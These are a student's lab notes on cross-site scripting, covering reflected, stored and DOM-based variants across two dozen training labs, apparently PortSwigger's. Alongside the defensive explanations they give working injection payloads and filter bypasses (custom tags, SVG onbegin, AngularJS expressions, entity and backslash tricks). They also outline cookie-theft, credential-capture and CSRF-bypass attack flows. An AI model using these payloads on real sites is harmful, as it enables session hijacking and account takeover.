## Cross-Site Scripting Notes

### What is XSS?

Cross-Site Scripting, also known as XSS, is a web security vulnerability that allows an attacker to inject JavaScript into a web page viewed by other users.

XSS happens when an application takes user-controlled input and displays it in a page without proper output encoding or sanitization.

If the browser interprets the input as code, the injected JavaScript can execute in the context of the vulnerable website.

### Why XSS Matters

JavaScript running inside a trusted website can interact with the page and the user's session.

Depending on the application and browser protections, XSS may allow attackers to:

View sensitive page content

Perform actions as the victim

Modify page content

Steal tokens if they are accessible to JavaScript

Create phishing forms inside the trusted website

Redirect users to malicious pages

### Common XSS Types

#### Reflected XSS

Reflected XSS occurs when user input is immediately included in the application's response.

Example flow:

```text
User input → Server response → Browser executes payload
```

A common example is a search page that reflects the search term back to the user without encoding.

#### Stored XSS

Stored XSS occurs when the payload is saved by the application and displayed later.

Example flow:

```text
User submits comment → Application stores comment → Another user views page → Browser executes payload
```

Stored XSS is usually more dangerous because it can affect many users without requiring each user to click a special link.

#### DOM-Based XSS

DOM-based XSS occurs when client-side JavaScript takes user-controlled data and writes it into the page in an unsafe way.

In this case, the vulnerability is mainly in the browser-side JavaScript rather than the server response.

### HTML Context

HTML context means the user input is placed directly inside the HTML body of the page.

Example:

```html
<p>You searched for: USER_INPUT</p>
```

If the application inserts this input without encoding, a payload such as:

```html
<script>alert(1)</script>
```

may be interpreted by the browser as JavaScript code.

### Output Encoding

Output encoding means converting dangerous characters into safe HTML entities.

Examples:

```text
< becomes &lt;
> becomes &gt;
" becomes &quot;
' becomes &#x27;
& becomes &amp;
```

If output is properly encoded, the browser displays the payload as text instead of executing it as code.

### Lab 01: Reflected XSS into HTML Context with Nothing Encoded

In this lab, the vulnerability existed in the search functionality.

The search input was reflected back into the HTML page without encoding.

The payload used was:

```html
<script>alert(1)</script>
```

The browser executed the payload because the application inserted it into the page as HTML instead of treating it as text.

#### Key Takeaway

Reflected XSS can happen when user input is immediately returned in the response without output encoding.

### Lab 02: Stored XSS into HTML Context with Nothing Encoded

In this lab, the vulnerability existed in the comment functionality.

The comment was stored by the application and later displayed on the blog post page without encoding.

The payload used was:

```html
<script>alert(1)</script>
```

The browser executed the payload when the blog post was viewed.

#### Key Takeaway

Stored XSS can happen when user-generated content is saved and later displayed without output encoding.

Stored XSS is often more dangerous than reflected XSS because it can affect multiple users.

### Main Difference Between Reflected and Stored XSS

| Type          | Where the payload goes   | When it executes                 |
| ------------- | ------------------------ | -------------------------------- |
| Reflected XSS | In the request           | Immediately in the response      |
| Stored XSS    | Saved in the application | When the affected page is viewed |

### Main Defense

The main defense against XSS is context-aware output encoding.

Applications should encode user-controlled input before displaying it in HTML, attributes, JavaScript, or URLs.

Input validation can help, but it should not replace output encoding.

Content Security Policy can also reduce XSS impact, but it should be used as an additional layer, not the only protection.

### Lab 03: DOM XSS in `document.write` Sink Using Source `location.search`

DOM-based XSS happens when the vulnerability exists in client-side JavaScript.

In this lab, the source was:

```javascript
location.search
```

This means the application read data from the URL query string.

The sink was:

```javascript
document.write()
```

This function writes content directly into the page.

The search input was placed inside an `img src` attribute. Because the input was not safely handled, it was possible to break out of the attribute and inject new HTML.

The payload used was:

```html
"><svg onload=alert(1)>
```

The first part closed the existing attribute and tag:

```html
">
```

Then a new SVG element was injected:

```html
<svg onload=alert(1)>
```

When the SVG loaded, the browser executed the JavaScript and displayed an alert.

#### Key Takeaway

DOM XSS can happen even when the server does not directly return the payload in the response.

If client-side JavaScript reads user-controlled data and writes it into the page using unsafe sinks like `document.write()`, JavaScript execution may be possible.

### Lab 04: DOM XSS in `innerHTML` Sink Using Source `location.search`

This lab focused on DOM-based XSS using the `innerHTML` sink.

The source was:

```javascript
location.search
```

This means the application read data from the URL query string.

The sink was:

```javascript
innerHTML
```

This is dangerous because `innerHTML` treats inserted content as HTML, not just plain text.

The payload used was:

```html
<img src=1 onerror=alert(1)>
```

The payload created an image element with an invalid source.

Because the image failed to load, the browser triggered the `onerror` event handler.

This executed:

```javascript
alert(1)
```

#### Key Takeaway

DOM XSS can occur when client-side JavaScript reads user-controlled data and inserts it into the page using unsafe sinks like `innerHTML`.

When displaying user-controlled text, safer APIs such as `textContent` should be used instead of `innerHTML`.

### Lab 05: DOM XSS in jQuery Anchor `href` Attribute Sink Using `location.search`

This lab focused on DOM-based XSS through an anchor tag's `href` attribute.

The source was:

```javascript
location.search
```

This means the application read data from the URL query string.

The sink was jQuery's `.attr()` function:

```javascript
$('#backLink').attr("href", value)
```

The application took the `returnPath` parameter from the URL and placed it inside the Back link's `href` attribute.

A normal value such as:

```text
/feedback
```

would make the Back link navigate to that page.

However, by setting the value to a JavaScript URL, the link could execute JavaScript when clicked.

The payload used was:

```text
javascript%3Aalert(document.cookie)
```

After URL decoding, this becomes:

```javascript
javascript:alert(document.cookie)
```

When the Back link was clicked, the browser executed the JavaScript and displayed the cookie.

#### Key Takeaway

DOM XSS can occur when user-controlled URL parameters are assigned to sensitive HTML attributes such as `href`.

Applications should validate return paths and should not allow dangerous URL schemes like `javascript:`.

### Lab 06: DOM XSS in jQuery Selector Sink Using a Hashchange Event

This lab focused on DOM-based XSS using the URL hash and a jQuery selector sink.

The source was:

```javascript
location.hash
```

This means the application read data from the part of the URL after the `#` symbol.

The event used was:

```javascript
hashchange
```

This event runs when the hash part of the URL changes.

The sink was jQuery's selector function:

```javascript
$()
```

The application expected the hash to contain a normal post title or selector value that could be used to scroll to a blog post.

However, because the hash value was user-controlled, it was possible to inject HTML instead of a normal selector.

The exploit used an iframe:

```html
<iframe src="https://0a9900f104e223f380a5037500a000be.web-security-academy.net/#" onload="this.src=this.src+'<img src=x onerror=print()>'"></iframe>
```

The iframe first loaded the vulnerable page with an empty hash.

After the iframe loaded, the `onload` event appended the payload to the hash.

The payload was:

```html
<img src=x onerror=print()>
```

The invalid image source caused the image to fail loading.

When the image failed to load, the `onerror` event executed:

```javascript
print()
```

#### Key Takeaway

DOM XSS can happen when client-side JavaScript uses `location.hash` unsafely.

If user-controlled hash values are passed into dangerous sinks such as jQuery's `$()` selector, an attacker may inject HTML or JavaScript behavior.

The `hashchange` event can be abused to trigger vulnerable JavaScript after the page has loaded.

### Lab 07: Reflected XSS into Attribute with Angle Brackets HTML-Encoded

This lab focused on reflected XSS in an HTML attribute context.

The search input was reflected inside a quoted attribute.

Angle brackets were HTML-encoded, so payloads such as:

```html
<script>alert(1)</script>
```

would not work because the browser would treat the angle brackets as text instead of HTML.

The successful technique was to break out of the existing attribute value and inject a new event handler attribute.

The payload used was:

```html
"onmouseover="alert(1)
```

The URL-encoded version was:

```text
%22onmouseover=%22alert(1)
```

The first quotation mark closed the original attribute value.

Then the payload added:

```html
onmouseover="alert(1)"
```

When the mouse moved over the affected element, the browser executed the JavaScript.

#### Key Takeaway

Encoding `<` and `>` is not always enough to prevent XSS.

If user input is inserted inside an HTML attribute, quotation marks and attribute-specific characters must also be encoded properly.

XSS prevention must be context-aware because the correct defense depends on where the input appears in the page.

### Lab 08: Stored XSS into Anchor `href` Attribute with Double Quotes HTML-Encoded

This lab focused on stored XSS through an anchor tag's `href` attribute.

The vulnerable input was the Website field in the comment form.

The application stored the Website value and later used it as the link target for the comment author's name.

A normal website value would create a link such as:

```html
<a href="https://example.com">Author Name</a>
```

However, the application allowed a JavaScript URL:

```javascript
javascript:alert(1)
```

This caused the author's name link to execute JavaScript when clicked.

Double quotes were HTML-encoded, so breaking out of the attribute was not the technique used in this lab.

Instead, the payload worked because the `href` attribute itself accepted a dangerous URL scheme.

#### Key Takeaway

Encoding quotes can prevent attribute breakout, but it does not fully protect against XSS in URL attributes.

When user input is used in an `href` attribute, the application must also validate the URL scheme and block dangerous values such as `javascript:`.

### Lab 09: Reflected XSS into a JavaScript String with Angle Brackets HTML-Encoded

This lab focused on reflected XSS inside a JavaScript string context.

The search input was reflected inside JavaScript code, not directly inside HTML.

Angle brackets were HTML-encoded, so payloads that rely on creating HTML tags, such as:

```html
<script>alert(1)</script>
```

would not work.

The successful technique was to break out of the JavaScript string and inject JavaScript directly.

The payload used was:

```javascript
'-alert(1)-'
```

The request used was:

```http
GET /?search='-alert(1)-' HTTP/2
```

The first single quote closed the original JavaScript string.

Then `alert(1)` executed as JavaScript.

The remaining characters helped keep the JavaScript syntax valid.

#### Key Takeaway

When input is reflected inside a JavaScript string, the payload must escape the string first.

Encoding `<` and `>` is not enough if characters such as quotes are not safely escaped in JavaScript contexts.

---

### XSS Context and Payload Summary

| Lab Context       | Where the input appears    | Example Payload             |
| ----------------- | -------------------------- | --------------------------- |
| HTML context      | Inside the HTML body       | `<script>alert(1)</script>` |
| Attribute context | Inside an HTML attribute   | `"onmouseover="alert(1)`    |
| `href` attribute  | Inside a link target       | `javascript:alert(1)`       |
| JavaScript string | Inside a JavaScript string | `'-alert(1)-'`              |

#### Main Lesson

There is no single XSS payload that works everywhere.

The correct payload depends on where the input appears in the page and how the browser interprets it.

### Lab 10: DOM XSS in `document.write` Sink Using Source `location.search` Inside a `select` Element

This lab focused on DOM-based XSS inside a `select` element.

The source was:

```javascript
location.search
```

The sink was:

```javascript
document.write()
```

The vulnerable value came from the `storeId` query parameter in the URL.

The application used this value to create a new option in the stock checker dropdown list.

A normal value such as:

```text
test123
```

appeared as an option inside the dropdown.

Because the input was inside a `select` element, the payload first needed to break out of the dropdown before injecting executable HTML.

The payload used was:

```html
"></select><img src=1 onerror=alert(1)>
```

The URL-encoded version was:

```text
%22%3E%3C%2Fselect%3E%3Cimg%20src%3D1%20onerror%3Dalert(1)%3E
```

The payload worked by closing the current context, closing the `select` element, and then injecting an image element with an invalid source.

When the image failed to load, the `onerror` event executed:

```javascript
alert(1)
```

#### Key Takeaway

DOM XSS payloads depend heavily on where the input appears in the DOM.

When user-controlled input is written inside a `select` element, the attacker may need to break out of the select context before injecting executable HTML.

Dangerous sinks such as `document.write()` should not be used with untrusted input.


### Lab 11: DOM XSS in AngularJS Expression with Angle Brackets and Double Quotes HTML-Encoded

This lab focused on DOM-based XSS through AngularJS expression injection.

The application used AngularJS and included the `ng-app` directive.

AngularJS can evaluate expressions written inside:

```text
{{ }}
```

For example:

```javascript
{{7*7}}
```

would be evaluated by AngularJS.

In this lab, angle brackets and double quotes were HTML-encoded, so normal HTML injection was not the correct technique.

Instead of using a payload such as:

```html
<script>alert(1)</script>
```

the successful payload used an AngularJS expression:

```javascript
{{$on.constructor('alert(1)')()}}
```

This payload executed JavaScript through AngularJS expression evaluation and triggered:

```javascript
alert(1)
```

#### Key Takeaway

XSS payloads depend on the execution context.

When input appears inside an AngularJS-controlled area, attackers may be able to use AngularJS expressions instead of HTML tags.

Encoding `<` and `>` is not enough if user input can still be evaluated as an AngularJS expression.


### Lab 12: Reflected DOM XSS

This lab focused on reflected DOM XSS.

In this vulnerability, the user input was first sent to the server through the search functionality.

The server reflected the input inside a JSON response from:

/search-results

Then, JavaScript on the page processed that reflected response unsafely.

The dangerous sink in this lab was:

eval()

The JavaScript file responsible for processing the response was:

searchResults.js

The payload used was:

\"-alert(1)}//

The URL-encoded version was:

%5C%22-alert%281%29%7D%2F%2F

The server response became similar to:

{"searchTerm":"\\"-alert(1)}//", "results":[]}

Because the page used eval() to process the response, the payload broke out of the string and executed:

alert(1)
#### Key Takeaway

Reflected DOM XSS happens when the server reflects user input, and then client-side JavaScript processes that reflected data in an unsafe way.

The main issue in this lab was:

Server reflects input into JSON response
Client-side JavaScript processes the response using eval()
Payload breaks out of the JSON/JavaScript string
JavaScript executes in the browser

### Reflected XSS vs DOM XSS vs Reflected DOM XSS

| Type | Where is the problem? |
|---|---|
| Reflected XSS | The server reflects user input directly inside the HTML response. |
| DOM XSS | JavaScript reads user input from the URL or page and writes it into the DOM unsafely. |
| Reflected DOM XSS | The server reflects user input in a response, then client-side JavaScript processes it unsafely. |

#### Main Lesson

Not every XSS vulnerability appears directly in the HTML page.

Sometimes the input appears inside a JSON response first, and the real danger happens later when JavaScript processes that response unsafely.

### Lab 13: Stored DOM XSS

This lab focused on stored DOM XSS in the blog comment functionality.

The payload was stored as a blog comment and later processed by client-side JavaScript.

The application attempted to prevent XSS by encoding angle brackets, but it used JavaScript `replace()` incorrectly.

When `replace()` is used with a normal string argument, it only replaces the first occurrence.

For example:

```javascript
text.replace("<", "&lt;")
```

This only replaces the first `<`.

The successful payload was:

```html
<><img src=1 onerror=alert(1)>
```

The first extra angle brackets were encoded by the weak filter:

```html
<>
```

But the real payload remained active:

```html
<img src=1 onerror=alert(1)>
```

When the image failed to load, the `onerror` event executed:

```javascript
alert(1)
```

#### Key Takeaway

Weak filtering can be bypassed if it only replaces the first dangerous character.

Stored DOM XSS happens when stored user input is later handled unsafely by client-side JavaScript and written into the DOM.

Simple string replacement is not a safe defense against XSS.

### Stored XSS vs Stored DOM XSS

| Type           | Simple Meaning                                                                              |
| -------------- | ------------------------------------------------------------------------------------------- |
| Stored XSS     | Payload is saved and later returned directly in the HTML response.                          |
| Stored DOM XSS | Payload is saved, then client-side JavaScript reads it and writes it into the DOM unsafely. |

#### Main Difference

In Stored XSS, the server returns the malicious payload directly inside the HTML page.

In Stored DOM XSS, the payload is stored first, but the dangerous execution happens later when JavaScript reads that stored data and writes it into the DOM in an unsafe way.

### Lab 14: Reflected XSS into HTML Context with Most Tags and Attributes Blocked

This lab focused on reflected XSS with WAF filtering.

The application reflected the search input into the HTML response, but most common XSS tags and attributes were blocked.

A standard payload such as:

```html
<img src=1 onerror=print()>
```

was blocked.

Using Burp Intruder, I tested which HTML tags were allowed by the WAF.

The allowed tag was:

```html
<body>
```

Then I tested event attributes and found that the allowed event was:

```html
onresize
```

The final reflected payload was:

```html
"><body onresize=print()>
```

The URL-encoded version was:

```text
%22%3E%3Cbody%20onresize=print()%3E
```

Because the lab required no user interaction, the exploit was delivered using an iframe:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

The iframe loaded the vulnerable page.

Then the iframe changed its width automatically using:

```html
onload=this.style.width='100px'
```

This triggered the `onresize` event and executed:

```javascript
print()
```

#### Key Takeaway

WAFs may block common XSS payloads, but they are not a complete defense.

If one tag or attribute is blocked, testing can reveal another allowed tag or event handler.

In this lab, the bypass worked because the `body` tag and `onresize` event were allowed.

The iframe made the exploit automatic, so the victim did not need to interact with the page.

### Lab 15: Reflected XSS into HTML Context with All Tags Blocked Except Custom Ones

This lab focused on bypassing tag-based XSS filtering using a custom HTML tag.

The application blocked common tags such as:

```html
<script>
<img>
<svg>
<body>
```

However, custom tags were still allowed.

The successful custom tag payload was:

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>
```

The URL-encoded version was:

```text
%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E
```

The final exploit server code was:

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

The custom tag was given:

```html
id=x
```

Then the URL used:

```text
#x
```

This caused the browser to focus the injected element.

The attribute:

```html
tabindex=1
```

made the custom element focusable.

When the element received focus, the event handler executed:

```javascript
alert(document.cookie)
```

#### Key Takeaway

Blocking standard HTML tags is not enough to prevent XSS.

Custom tags can still be dangerous if event handler attributes are allowed.

The combination of `id`, `tabindex`, `onfocus`, and a URL fragment can make an XSS payload execute automatically without user interaction.


### Lab 16: Reflected XSS with Some SVG Markup Allowed

This lab focused on reflected XSS using SVG markup.

The application blocked common XSS payloads such as:

```html
<img src=1 onerror=alert(1)>
```

However, the filter was incomplete because it allowed some SVG tags and events.

Using Burp Intruder, I found that some SVG-related tags were allowed, including:

```html
<svg>
<animatetransform>
<title>
<image>
```

Then I tested event attributes and found that the allowed event was:

```html
onbegin
```

The successful payload was:

```html
"><svg><animatetransform onbegin=alert(1)>
```

The URL-encoded version was:

```text
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%3E
```

The final URL used was:

```text
/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%3E
```

The payload worked because the application allowed SVG markup and the `onbegin` event handler.

When the SVG animation element began, the browser executed:

```javascript
alert(1)
```

#### Key Takeaway

WAFs and filters may block common HTML tags but still miss SVG-specific tags and events.

SVG can be dangerous because it supports animation elements and event handlers.

In this lab, the bypass worked by combining:

```text
Allowed SVG context: svg
Allowed SVG tag: animatetransform
Allowed event: onbegin
JavaScript function: alert(1)
```

This shows that XSS filtering must handle HTML, SVG, attributes, and browser events, not only common tags such as `script` or `img`.

### Lab 17: Reflected XSS in Canonical Link Tag

This lab focused on reflected XSS inside a canonical link tag.

A canonical link tag usually looks like this:

```html
<link rel="canonical" href="https://example.com/">
```

The application reflected user-controlled input inside the `href` attribute.

Because angle brackets were escaped, normal HTML tag injection did not work.

The successful payload was added directly to the URL:

```text
?%27accesskey=%27x%27onclick=%27alert(1)
```

Decoded, this becomes:

```text
?'accesskey='x'onclick='alert(1)
```

The payload injected two attributes into the canonical link tag:

```html
accesskey='x'
onclick='alert(1)'
```

The `accesskey` attribute assigns a keyboard shortcut to the element.

The `onclick` attribute executes JavaScript when the element is activated.

#### Key Takeaway

XSS can occur inside existing tags through attribute injection.

Even when `<` and `>` are escaped, XSS may still be possible if quotes are not handled safely in an HTML attribute context.

### Lab 18: Reflected XSS into a JavaScript String with Single Quote and Backslash Escaped

This lab focused on reflected XSS inside a JavaScript string.

The application escaped:

```text
'
```

and:

```text
\
```

This prevented a normal JavaScript string breakout.

For example, a payload using a single quote would be escaped and kept inside the string.

The successful payload was:

```html
</script><script>alert(1)</script>
```

The URL-encoded version was:

```text
%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

The payload worked by closing the existing script block:

```html
</script>
```

Then injecting a new script block:

```html
<script>alert(1)</script>
```

#### Key Takeaway

When input is reflected inside a JavaScript string, escaping quotes can block simple string breakout payloads.

However, if angle brackets are not encoded, `</script>` can close the script block and allow a new script tag to execute.


### Lab 19: Reflected XSS into a JavaScript String with Angle Brackets and Double Quotes HTML-Encoded and Single Quotes Escaped

This lab focused on reflected XSS inside a JavaScript string.

The application protected against some characters:

```text id="tybsj5"
< and > were HTML-encoded
" was HTML-encoded
' was escaped
```

However, the application did not escape:

```text id="xbmsy9"
\
```

This made it possible to bypass the escaping.

The successful payload was:

```javascript id="q6qs20"
\'-alert(1)//
```

The URL-encoded version was:

```text id="h35edi"
%5C%27-alert%281%29%2F%2F
```

The payload worked because the original backslash combined with the application's escaping behavior and allowed the single quote to break out of the JavaScript string.

The JavaScript became similar to:

```javascript id="qz1mco"
var searchTerms = '\\'-alert(1)//';
```

Then the payload executed:

```javascript id="ut9hyd"
alert(1)
```

and used:

```javascript id="1fz95m"
//
```

to comment out the rest of the line.

#### Key Takeaway

Escaping single quotes alone is not enough in a JavaScript string context.

Backslashes must also be escaped correctly because they can change how the browser interprets quotes.

### Lab 20: Stored XSS into `onclick` Event

This lab focused on stored XSS inside an `onclick` event handler.

The vulnerable input was the Website field in the comment form.

The application stored the Website value and later inserted it into an `onclick` attribute connected to the comment author's name.

The application protected some characters:

```text
< and > were HTML-encoded
" was HTML-encoded
' was escaped
\ was escaped
```

The successful payload was:

```text
http://foo?&apos;-alert(1)-&apos;
```

The important part was:

```html
&apos;
```

This is an HTML entity that represents a single quote:

```text
'
```

After browser parsing, the payload was able to break out of the JavaScript string inside the `onclick` handler and execute:

```javascript
alert(1)
```

#### Encoding vs Escaping

| Term     | Simple Meaning                                | Example            |
| -------- | --------------------------------------------- | ------------------ |
| Encoding | Converts dangerous characters into safe text  | `<` becomes `&lt;` |
| Escaping | Adds a character to stop breaking code syntax | `'` becomes `\'`   |

#### Key Takeaway

XSS payloads depend on the exact context.

In this lab, the context was not normal HTML and not a normal URL attribute.

The input was inside a JavaScript event handler, so the successful bypass used `&apos;` to introduce a single quote after browser parsing.

### Lab 21: Reflected XSS into a JavaScript Template Literal

This lab focused on reflected XSS inside a JavaScript template literal.

Template literals use backticks:

```javascript id="0j2uin"
`example text`
```

They can also evaluate expressions using:

```javascript id="tgw75k"
${}
```

The successful payload was:

```javascript id="g37qam"
${alert(1)}
```

The payload worked because the input was placed inside an existing template literal. JavaScript evaluated the expression inside `${}` and executed:

```javascript id="e7t1kt"
alert(1)
```

#### Key Takeaway

In template literal contexts, the payload does not need to break out of the string.

Using `${}` can execute JavaScript directly inside the template literal.

### Lab 22: Exploiting XSS to Steal Cookies

**Status:** Pending - Tool Limitation

This lab focuses on using stored XSS to steal a victim user's session cookie.

The idea is that a malicious script is stored inside a blog comment. When the simulated victim views the comment, the script runs in the victim's browser and sends `document.cookie` to an external interaction server.

In the intended solution, Burp Collaborator is used to receive the victim's cookie.

The general attack flow is:

```text id="lab22-flow"
1. Store an XSS payload in a blog comment.
2. The victim views the comment.
3. The script reads document.cookie.
4. The script sends the cookie to Burp Collaborator.
5. The attacker uses the captured session cookie to impersonate the victim.
```

This lab was not completed because it requires Burp Collaborator / Burp Suite Professional to receive the victim's cookie through an external interaction.

#### Why This Lab Matters

This lab shows the real impact of XSS beyond `alert(1)`.

If session cookies are readable by JavaScript, stored XSS can allow an attacker to steal a victim's session and impersonate them.

#### Key Takeaway

XSS can lead to session hijacking if sensitive cookies are accessible through JavaScript.

Cookies should be protected with security flags such as `HttpOnly` where possible, and the main priority is to prevent XSS in the first place.

---

### Lab 23: Exploiting XSS to Capture Passwords

**Status:** Pending - Tool Limitation

This lab focuses on using stored XSS to capture user credentials.

The idea is to inject malicious HTML and JavaScript into a blog comment. When the victim views the comment, the injected content can create password-related fields or interact with the browser in a way that captures credentials and sends them to an external interaction server.

In the intended solution, Burp Collaborator is used to receive the captured credentials.

The general attack flow is:

```text id="lab23-flow"
1. Store an XSS payload in a blog comment.
2. The victim views the comment.
3. The payload creates or abuses input fields in the page.
4. The victim's credentials are captured.
5. The captured data is sent to Burp Collaborator.
```

This lab was not completed because it requires an external interaction server such as Burp Collaborator, which is not available in Burp Suite Community Edition.

#### Why This Lab Matters

This lab shows that XSS can be used for credential theft, not only cookie theft.

A malicious script can modify the page, create fake inputs, or capture sensitive values entered by the user.

#### Key Takeaway

Stored XSS can be used to steal sensitive user information such as passwords if malicious JavaScript runs in the victim's browser.

Strong output encoding, sanitization, and safe rendering are required to prevent this type of attack.

---

### Lab 24: Exploiting XSS to Bypass CSRF Defenses

This lab showed how stored XSS can bypass CSRF protection.

The email change function required a CSRF token, but the injected JavaScript could access the victim's account page because it ran in the victim's browser.

The payload performed three actions:

```text id="vij9pj"
1. Load /my-account
2. Extract the CSRF token
3. Send a POST request to /my-account/change-email
```

The lab was solved immediately after posting the comment because the simulated victim automatically viewed the comment and triggered the stored XSS payload.

#### Why Changing the Email Matters

Changing the email proves that the attacker can perform an authenticated action as the victim.

In real applications, changing the email can be serious because it may help with account takeover, especially if password reset links are sent to the email address.

#### Key Takeaway

CSRF tokens do not fully protect an application if XSS exists.

With XSS, an attacker can read tokens from the page and submit valid requests from inside the victim's session.
